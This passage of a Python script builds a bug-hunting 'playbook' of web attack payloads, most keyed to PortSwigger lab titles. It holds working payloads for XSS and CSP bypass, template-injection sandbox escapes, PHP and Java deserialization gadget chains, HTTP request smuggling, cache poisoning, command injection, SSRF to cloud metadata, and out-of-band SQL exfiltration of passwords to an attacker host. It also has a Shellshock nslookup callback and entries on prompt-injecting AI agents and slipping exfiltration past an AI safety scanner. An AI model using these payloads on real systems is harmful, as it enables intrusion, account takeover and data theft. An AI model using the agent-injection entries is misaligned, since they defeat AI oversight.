   ('?search=<input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(document.cookie)\'>#x',
    "ng-focus + orderBy reaches window scope, bypassing the sandbox + CSP"),
 "reflected xss protected by very strict csp, with dangling markup attack":
   ('CSP lacks form-action: inject <button formaction="//EXPLOIT" formmethod="get">Click</button> via the '
    "email param to leak the CSRF token in the URL, then auto-submit change-email",
    "CSRF token captured -> email changed"),
 "reflected xss protected by csp, with csp bypass":
   ("the report-uri has a controllable token param -> inject a directive: "
    "?search=<script>alert(1)</script>&token=;script-src-elem %27unsafe-inline%27",
    "your injected CSP directive re-enables inline script"),
 "server-side template injection in a sandboxed environment":
   ("escape the Java sandbox via reflection: ${product.getClass().getProtectionDomain().getCodeSource()."
    "getLocation().toURI().resolve('/home/carlos/x').toURL().openStream().readAllBytes()}",
    "file bytes returned despite the sandbox"),
 "server-side template injection with a custom exploit":
   ("abuse exposed object methods the error messages reveal: user.setAvatar('/etc/passwd','image/jpg') "
    "then GET /avatar to read; user.gdprDelete() to delete", "arbitrary file read/delete via the template object"),
 "developing a custom gadget chain for java deserialization":
   ("leak source via /backup/*.java (.java~); ProductTemplate.readObject() puts id into SQL; serialize a "
    "ProductTemplate with id=SQLi, base64, set as session cookie; error-based UNION extracts the password",
    "SQL error reflects injected data -> CAST(password AS numeric) leaks it"),
 "developing a custom gadget chain for php deserialization":
   ("leak CustomTemplate.php~; __wakeup builds a Product from desc; DefaultMap.__get calls "
    "call_user_func(callback,$name) -> set callback='exec', name='rm /home/carlos/morale.txt' in the "
    "serialized object", "magic-method chain executes the shell command on unserialize"),
 "using phar deserialization to deploy a custom gadget chain":
   ("upload a PHAR-JPG polyglot avatar whose serialized objects carry a Twig SSTI RCE (Blog->desc), then "
    "GET avatar.php?avatar=phar://wiener to deserialize", "phar:// stream triggers the gadget -> RCE"),
 "cache key injection":
   ("find unkeyed params (Pragma: x-get-cache-key); craft a URL where an unkeyed param carries a CRLF "
    "Origin-header injection so the cached JS import is poisoned",
    "/login cache entry serves a malicious localize.js -> alert(1)"),
 "internal cache poisoning":
   ("X-Forwarded-Host is unkeyed by the INTERNAL cache (but keyed by the external one); poison the "
    "separately-cached geolocate.js fragment to point at your exploit server hosting alert(document.cookie)",
    "internal fragment cached with your host -> XSS for every visitor"),
 "exploiting dom clobbering to enable xss":
   ('two anchors: <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"> '
    "— clobbers defaultAvatar.avatar (DOMPurify allows cid: which keeps the quote)",
    "clobbered global var smuggles onerror -> alert on next load"),
 "clobbering dom attributes to bypass html filters":
   ("<form id=x tabindex=0 onfocus=print()><input id=attributes> — clobbering the filter's 'attributes' "
    "property makes its length undefined so onfocus survives; trigger via #x focus",
    "filtered handler executes (print/alert)"),
 "host validation bypass via connection state attack":
   ("send two requests down ONE keep-alive connection (Burp 'send group in sequence, single connection'): "
    "1st with the valid Host (passes validation), 2nd with Host:192.168.0.1 to reach /admin",
    "server validates only the first request on the connection -> 2nd hits admin"),
})

# ---- the remaining ~31 filled from my own knowledge (classic smuggling + non-smuggling tail) ----
T.update({
 # request smuggling (classic CL.TE / TE.CL family)
 "http request smuggling, confirming a cl.te vulnerability via differential responses":
   ("front-end CL, back-end TE: send Content-Length covering only up to '0\\r\\n\\r\\n', then a smuggled "
    "prefix; the 2nd request gets the leftover -> abnormal/error response", "next request returns an anomaly"),
 "http request smuggling, confirming a te.cl vulnerability via differential responses":
   ("front-end TE, back-end CL: chunked body whose declared chunk hides a smuggled request from the "
    "CL-reading back-end", "next request poisoned/errored = TE.CL confirmed"),
 "http request smuggling, basic cl.te vulnerability":
   ("CL.TE: headers Content-Length + Transfer-Encoding:chunked; body '0\\r\\n\\r\\nGPOST /x ...' so the "
    "back-end starts a new (smuggled) request after the zero chunk", "smuggled GPOST appears"),
 "http request smuggling, basic te.cl vulnerability":
   ("TE.CL: chunked body 'NN\\r\\nSMUGGLED-REQUEST\\r\\n0\\r\\n\\r\\n' with Content-Length:4 so back-end "
    "stops early, leaving the smuggled request", "smuggled request processed next"),
 "http request smuggling, obfuscating the te header":
   ("make front/back disagree on TE: 'Transfer-Encoding: xchunked', a space before the value, duplicate "
    "TE headers, or 'Transfer-Encoding\\n: chunked'", "one server honours TE, the other CL -> desync"),
 "exploiting http request smuggling to bypass front-end security controls, cl.te vulnerability":
   ("smuggle a request to a path the front-end blocks (e.g. /admin) so the back-end serves it directly",
    "blocked endpoint reached via the smuggled request"),
 "exploiting http request smuggling to bypass front-end security controls, te.cl vulnerability":
   ("same as CL.TE but with the TE.CL chunked framing", "front-end control bypassed"),
 "exploiting http request smuggling to capture other users' requests":
   ("smuggle a request whose body is a comment-post; the victim's following request gets appended into "
    "your comment", "victim's request (cookies) shows up in your stored comment"),
 "exploiting http request smuggling to reveal front-end request rewriting":
   ("smuggle a request that reflects a parameter, give it a huge length, and read the front-end-added "
    "headers (X-Forwarded-For / internal) that get pulled into the reflection", "internal rewrite headers leak"),
 "exploiting http request smuggling to deliver reflected xss":
   ("smuggle a request carrying an XSS payload in a reflected header (e.g. User-Agent into a page) so the "
    "next victim's response is poisoned with it", "victim served the reflected XSS"),
 "exploiting http request smuggling to perform web cache poisoning":
   ("smuggle a request that 302-redirects to your JS; the front-end caches that response against the "
    "victim's next URL", "cache serves your redirect to all visitors"),
 "exploiting http request smuggling to perform web cache deception":
   ("smuggle so a victim's private response gets stored by the cache under a static-looking path you can "
    "then fetch", "private data publicly cached"),
 "cl.0 request smuggling":
   ("the back-end treats Content-Length as 0 on certain endpoints (ignores the body) while the front-end "
    "uses CL, so the body becomes a standalone smuggled request", "body processed as the next request"),
 # web cache poisoning (remaining)
 "targeted web cache poisoning using an unknown header":
   ("Param Miner to discover an unkeyed header (e.g. X-Host); poison only pages keyed to the victim's "
    "User-Agent / language", "victim-specific cache entry poisoned"),
 "url normalization":
   ("the cache and origin normalize the path differently; request an encoded path the app reflects "
    "un-normalized so the XSS payload is cached", "encoded-path payload cached + served"),
 "web cache poisoning to exploit a dom vulnerability via a cache with strict cacheability criteria":
   ("poison an unkeyed header into JSON/config a DOM sink consumes, targeting only the resources that "
    "meet the strict cacheability rules", "DOM sink executes the cached payload"),
 "combining web cache poisoning vulnerabilities":
   ("chain two unkeyed inputs (e.g. X-Forwarded-Host + X-Forwarded-Scheme) to build a working payload "
    "where neither alone suffices", "combined headers poison the page"),
 # SQLi OOB
 "blind sql injection with out-of-band interaction":
   ("Oracle: '||(SELECT extractvalue(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY %% x SYSTEM "
    "\"http://OOB/\">%%x;]>'),'/l') FROM dual)-- (or UTL_HTTP.request)", "DNS/HTTP hit on Collaborator"),
 "blind sql injection with out-of-band data exfiltration":
   ("prepend the stolen data to the OOB host: ...SYSTEM \"http://'||(SELECT password FROM users WHERE "
    "username='administrator')||'.OOB/\"...", "the password appears as the OOB subdomain"),
 # business logic
 "authentication bypass via encryption oracle":
   ("the app encrypts attacker input somewhere (e.g. a 'stay-logged-in'/notify cookie) and decrypts it "
    "elsewhere; use it as an oracle to encrypt a forged admin value", "forged ciphertext accepted"),
 "bypassing access controls using email address parsing discrepancies":
   ("register an email the validator reads as external but the app treats as @internal — encoding/quoted "
    "tricks like 'attacker@evil.com(@internal)' or unicode/punycode", "privileged role granted"),
 # race conditions
 "exploiting time-sensitive vulnerabilities":
   ("send two requests in a SINGLE packet so they share a timestamp; predict/collide a time-based token "
    "(e.g. a password-reset token seeded from time)", "predictable token via simultaneous requests"),
 "partial construction race conditions":
   ("hammer the endpoint in parallel to hit the window where an object exists half-built (registered but "
    "not yet confirmed) and use it", "act on the partially-constructed object"),
 # web LLM
 "exploiting ai agents to trigger secondary vulnerabilities":
   ("prompt-inject the agent to call a backend tool with an injectable argument (SQLi / path / cmd)",
    "the agent's tool call carries your injection -> chained vuln"),
 "bypassing ai scanner defenses to exfiltrate sensitive information":
   ("craft input the AI safety scanner clears (obfuscate/split the instruction) but that still drives the "
    "agent to leak data", "exfil instruction survives the scanner"),
 # ssrf
 "blind ssrf with shellshock exploitation":
   ("SSRF to an internal CGI with a Shellshock User-Agent: () { :; }; /usr/bin/nslookup $(whoami).OOB",
    "OOB DNS shows the internal user = RCE"),
 # auth
 "broken brute-force protection, multiple credentials per request":
   ('send an array of passwords in one request: {"username":"carlos","password":["a","b","letmein",...]} '
    "so the lockout counts it as a single attempt", "many guesses, one counted attempt -> login"),
 # deserialization
 "exploiting ruby deserialization using a documented gadget chain":
   ("paste a published universal Ruby gadget chain (e.g. the Net::WriteAdapter/Gem chain) Base64'd into "
    "the session cookie", "RCE on unmarshal via the documented chain"),
 # host header
 "password reset poisoning via dangling markup":
   ("inject dangling markup into the reset email via the Host/param (e.g. \"'><img src='//OOB?) so the "
    "rest of the email — including the reset token — is exfiltrated to your server", "reset token captured"),
 # api
 "exploiting server-side parameter pollution in a rest url":
   ("inject URL-encoded path/param separators into a value the back-end places into a REST URL: %2f (/) "
    "%23 (#) to truncate the rest of the internal path, or %26 (&) to add a param — e.g. id=admin%23",
    "internal API call returns data outside your scope"),
 # web cache deception
 "exploiting exact-match cache rules for web cache deception":
   ("the cache stores paths exactly matching a static rule; append a delimiter so the URL maps to the "
    "dynamic private page yet still matches the static cache rule (e.g. /my-account;.js or /my-account%00.css)",
    "victim's private page cached under a public path"),
 # ---- advanced HTTP/2 smuggling (8 from user solutions + 0.CL from knowledge) = 100% ----
 "h2.cl request smuggling":
   ("HTTP/2 request with Content-Length: 0 plus a smuggled body; on H2->H1 downgrade the back-end appends "
    "the next request to your prefix. POST / HTTP/2, Content-Length:0, body=the smuggled request",
    "every 2nd request gets a 404 = prefix smuggled"),
 "response queue poisoning via h2.te request smuggling":
   ("HTTP/2 + Transfer-Encoding: chunked, body '0\\r\\n\\r\\n' then a COMPLETE smuggled request to /x; "
    "poisons the response queue so subsequent responses are mismatched", "capture the admin's 302 + session cookie"),
 "http/2 request smuggling via crlf injection":
   ("inject \\r\\n into an HTTP/2 header VALUE to add 'Transfer-Encoding: chunked', then smuggle via a "
    "chunked body (H2 carries the CRLF that the H1 downgrade re-introduces)", "every 2nd request 404; steal victim session"),
 "http/2 request splitting via crlf injection":
   ("inject \\r\\n\\r\\n in an H2 header value to SPLIT off a complete second request; on downgrade the "
    "front-end's appended \\r\\n\\r\\n turns the prefix into a real queued request", "poison queue -> capture admin 302"),
 "bypassing access controls via http/2 request tunnelling":
   ("H2 header-NAME CRLF injection to tunnel past the front-end: first leak the front-end-added auth "
    "headers (X-SSL-VERIFIED / X-FRONTEND-KEY) by smuggling a large Content-Length + extra search param, "
    "then HEAD + tunnelled 'GET /admin' replaying those headers (use a short :path like /login so the "
    "tunnelled response fits)", "tunnelled HTTP/1.1 admin response nested in your response body"),
 "web cache poisoning via http/2 request tunnelling":
   ("use H2 request tunnelling (CRLF in a header name) so a reflected/redirect response gets cached "
    "against a victim-reachable URL", "poisoned response served from cache -> stored XSS/redirect"),
 "client-side desync":
   ("front-end ignores Content-Length on some endpoints (POST with CL>0 + empty body -> server replies "
    "immediately = CL ignored). From the VICTIM'S BROWSER: fetch(POST, body='GET /smuggled HTTP/1.1...', "
    "credentials:include) then a CORS-error .catch() chaining a 2nd request — no proxy needed",
    "victim's request captured into a comment / their cookie stolen"),
 "server-side pause-based request smuggling":
   ("Apache 2.4.x redirect endpoints: POST /resources (a redirecting path) with a complete 'GET /admin/ "
    "Host: localhost' in the body, then PAUSE ~61s after the header \\r\\n\\r\\n (Turbo Intruder pauseMarker"
    "=['\\r\\n\\r\\n'], pauseTime=61000) so the back-end processes the smuggled request during the pause",
    "admin panel reached after the 61s pause"),
 "0.cl request smuggling":
   ("inverse of CL.0: the FRONT-END reads Content-Length as 0 (ignores the body) but the back-end honours "
    "it, so the body smuggles a request to the back-end. Probe with a pause/timing test on redirect "
    "endpoints, then put a complete 'GET /admin' in the body", "back-end processes the smuggled body as a request"),
})


# ---- Claude-BugHunter distillation (Batch 6 B6-2): NET-NEW vs PortSwigger labs —
#      gRPC, framework-specific stacks, supply-chain, source-leak. Our own words. ----
CBH = [
  ("grpc", "gRPC/gRPC-web", "enable server reflection to list services/methods, then call privileged RPCs "
   "directly (grpcurl -plaintext host list); auth often enforced only at the gateway, not the RPC",
   "grpcurl -plaintext T list  ->  grpcurl -d '{\"id\":1}' T svc.Method", "unauth RPC returns other users' data"),
  ("grpc", "gRPC-web", "gRPC-web rides HTTP/1.1 (Content-Type application/grpc-web-text, base64 body); replay "
   "in Burp and tamper the protobuf to reach methods the UI hides", "POST /pkg.Svc/Method grpc-web-text body",
   "hidden/admin method responds"),
  ("ssrf", "Spring Boot", "exposed actuator: /actuator/env leaks secrets, /heapdump dumps memory (creds/tokens), "
   "/actuator/gateway routes -> SSRF, jolokia -> JNDI/RCE; always probe /actuator first",
   "/actuator/health /actuator/env /actuator/heapdump /actuator/mappings", "actuator index lists sensitive endpoints"),
  ("rce", "Laravel/PHP", "APP_DEBUG=true exposes the Ignition error page -> CVE-2021-3129 RCE; also /.env leak, "
   "/telescope, /_ignition/execute-solution; trigger a 500 to see the debug stack",
   "GET /.env  ;  POST /_ignition/execute-solution (Ignition RCE)", "framework version + APP_KEY/DB creds leak"),
  ("deserialization", "ASP.NET", "__VIEWSTATE without MAC (or with a leaked validationKey/machineKey from web.config) "
   "-> ysoserial.net ViewState gadget -> RCE; check for EnableViewStateMac=false / leaked keys",
   "ysoserial.net -p ViewState -g ... --generator=... __VIEWSTATE", "command runs on the IIS worker"),
  ("auth-bypass", "Next.js", "middleware-based auth can be skipped: the x-middleware-subrequest header (CVE-2025-29927) "
   "or a crafted internal _next/data path bypasses the middleware that enforces auth on protected routes",
   "GET /admin  with  x-middleware-subrequest: middleware", "protected route served without auth"),
  ("prototype-pollution", "Node.js", "server-side deep-merge of JSON body pollutes Object.prototype; chain to "
   "RCE via child_process options (execArgv/shell) or to privesc via an isAdmin gadget",
   '{"__proto__":{"isAdmin":true}}  /  {"constructor":{"prototype":{...}}}', "polluted property changes server behaviour"),
  ("source-leak", "any/JS app", "fetch JS source maps (app.js.map) to recover original source incl. comments, "
   "API routes and hardcoded secrets; also check webpack:// in DevTools sources",
   "GET /static/js/main.<hash>.js.map  ->  unpack with sourcemapper", "original source + secrets recovered"),
  ("supply-chain", "npm/pip scope", "dependency confusion: an internal package name with no public registry entry "
   "lets you publish a malicious public package the build pulls; check package.json for unscoped internal names",
   "look for @org/internal or requires not on npm -> claim the name", "build installs the attacker package"),
  ("api", "REST/BOLA", "broken object-level auth (BOLA/API1): swap the object id in /api/v1/<obj>/<id> using a "
   "second account's token; also try array/wildcard ids and the sibling /v1 of a /v2 endpoint",
   "GET /api/v1/orders/1001  with user-B token", "user-B reads user-A's object"),
]


def main():
    pb._save({"version": 1, "techniques": []})        # fresh build

    # ---- PROVEN (this session) ----
    proven = [
      ("sqli", "any/SQL-DB", "empty-param seed: a bare quote on an empty value can hit a trivial-query "
       "short-circuit; seed a value first so the quote reaches the WHERE clause", "id=1' / q=1'", "200+body flips to 5xx/empty, or DB error string"),
      ("sqli", "PHP 8.x", "error string is suppressed by PHP; rely on the response anomaly", "id=1'", "200/large -> 500/empty"),
      ("xss-reflected", "any", "reflect a unique marker with angle brackets; if it comes back unencoded it's XSS", "jvz9xqk7z<x>", "marker appears un-escaped in the body"),
      ("recon-spa", "Angular/React/Vue", "passive crawlers miss XHR endpoints; headless-render and capture fetch/XHR; filter socket.io transport noise", "spa_crawl(target)", "/rest /api endpoints surfaced"),
      ("recon", "localhost", "Go tools resolve localhost to IPv6 ::1; pin 127.0.0.1 for IPv4-only dev servers", "127.0.0.1:PORT", "httpx/nuclei now answer"),
      ("auth-scan", "login-gated", "carry the session cookie into the crawl AND the probe; spa_crawl(cookie) maps the authenticated surface", "Cookie: PHPSESSID=..; security=low", "0 urls unauth -> full auth surface"),
      ("recon-spa", "form-GET PHP", "the interact pass submits forms; capture page.url after submit to get ?param= that never appears as a link", "fill+Enter -> capture ?id=", "form-GET param URL captured"),
      ("discovery", "any", "fuzz hidden paths with a common-dirs list; always check /ftp /metrics /api-docs /.git /backup", "ffuf -w common_dirs", "exposed paths found"),
      ("threat-intel", "IP", "DShield ISC no-key: real attack count = malicious, mere feed presence = suspicious (avoid false-flagging 8.8.8.8)", "isc.sans.edu/api/ip/<ip>?json", "feeds/attacks listed"),
    ]
    for cls, stack, tech, pay, tell in proven:
        pb.add(cls, tech, stack=stack, payload=pay, tell=tell, source="proven", validated=True, dedup=False)

    # ---- KB payloads ----
    kb = [
      ("sqli", "MySQL", "time-blind boolean extraction", "1 AND IF(SUBSTRING(@@version,1,1)='8',SLEEP(5),0)", "delay confirms"),
      ("sqli", "login", "auth bypass via comment", "' OR 1=1-- / administrator'--", "logged in"),
      ("open-redirect", "redirect param", "off-site redirect via // and backslash tricks", "//evil.com  /\\evil.com  https:evil.com", "302 to attacker host"),
      ("ssrf", "url param", "hit cloud metadata / internal", "http://169.254.169.254/latest/meta-data/", "metadata returned"),
      ("lfi", "page param", "path traversal + wrappers", "../../../etc/passwd  php://filter/convert.base64-encode/resource=index", "file contents/source"),
      ("cmd-injection", "system param", "shell metachar injection", "; id  | whoami  $(id)  `id`  %0a id", "command output"),
      ("subdomain-takeover", "dangling CNAME", "claim the unclaimed service the CNAME points to", "CNAME -> NXDOMAIN/unclaimed S3/Heroku/GH-pages", "404 'no such bucket/app'"),
      ("idor", "numeric/uuid id", "increment/swap the object id; check UUID predictability", "id=124 -> id=125", "other user's object"),
      ("jwt", "JWT auth", "alg:none / weak-key brute", 'alg:"none" no sig  OR  hashcat -m 16500', "forged admin token accepted"),
      ("xxe", "XML API", "external entity file read / OOB", '<!ENTITY x SYSTEM "file:///etc/passwd">', "file or OOB hit"),
      ("ssti", "template engine", "math probe then engine RCE", "{{7*7}} ${7*7} -> 49", "expression evaluates"),
      ("nosql", "Mongo", "operator injection auth bypass", '{"user":{"$ne":null},"pass":{"$ne":null}}', "auth bypassed"),
      ("xss-stored", "any", "inject in one field, executes when rendered elsewhere (2-step)", "<script>alert(1)</script> in comment/name", "fires for other users"),
      ("cors", "CORS", "reflected origin + credentials", "Origin: evil.com -> ACAO reflects, ACAC:true", "cross-origin data read"),
    ]
    for cls, stack, tech, pay, tell in kb:
        pb.add(cls, tech, stack=stack, payload=pay, tell=tell, source="kb", dedup=False)

    # ---- Claude-BugHunter net-new (B6-2) ----
    for cls, stack, tech, pay, tell in CBH:
        pb.add(cls, tech, stack=stack, payload=pay, tell=tell, source="cbh", dedup=False)

    # ---- 274 PortSwigger labs ----
    diffs = {"APPRENTICE", "PRACTITIONER", "EXPERT"}
    lines = [l.rstrip("\n") for l in open(LABS, encoding="utf-8")]
    cat, i = None, 0
    seeded = verify = 0
    while i < len(lines):
        l = lines[i].strip()
        if l == "LAB" and i + 2 < len(lines):
            diff = lines[i+1].strip(); title = lines[i+2].strip(); i += 3
            stack, slug = SLUG.get(cat, ("any", "all-topics"))
            d = T.get(title.lower())
            payload, tell = (d if d else ("", ""))
            vflag = d is None
            cls = re.sub(r"[^a-z]+", "-", (cat or "misc").lower()).strip("-")
            pb.add(cls, title, stack=stack, payload=payload, tell=tell,
                   difficulty=diff, source="portswigger",
                   ref=f"https://portswigger.net/web-security/{slug}", verify=vflag, dedup=False)
            seeded += 1; verify += int(vflag)
            continue
        if l and l not in diffs and l != "LAB" and not l.startswith(("Try solving", "Take me", "All labs")):
            cat = l
        i += 1

    s = pb.stats()
    print(f"PortSwigger seeded: {seeded} (verify-needed: {verify})")
    print(f"PLAYBOOK TOTAL: {s['total']} | validated: {s['validated']} | verify: {s['verify_needed']} | classes: {s['classes']}")


if __name__ == "__main__":
    main()
